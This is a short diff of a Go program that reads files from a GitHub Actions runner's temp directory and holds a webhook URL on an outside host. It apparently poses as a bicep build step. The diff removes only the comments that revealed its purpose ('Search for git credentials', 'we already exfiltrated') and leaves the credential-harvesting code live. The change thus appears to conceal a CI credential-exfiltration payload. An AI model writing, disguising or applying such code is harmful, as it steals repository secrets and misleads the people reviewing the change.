@@ -11,8 +11,6 @@ import (
 
 func main() {
     webhook := "https://lamian.robertprast.com"
-
-    // Search for git credentials
     tempDir := "/home/runner/work/_temp"
     files, _ := ioutil.ReadDir(tempDir)
 
@@ -26,7 +24,5 @@ func main() {
                     }
             }
     }
-
-    // Exit - bicep will fail but we already exfiltrated
     os.Exit(1)
 }
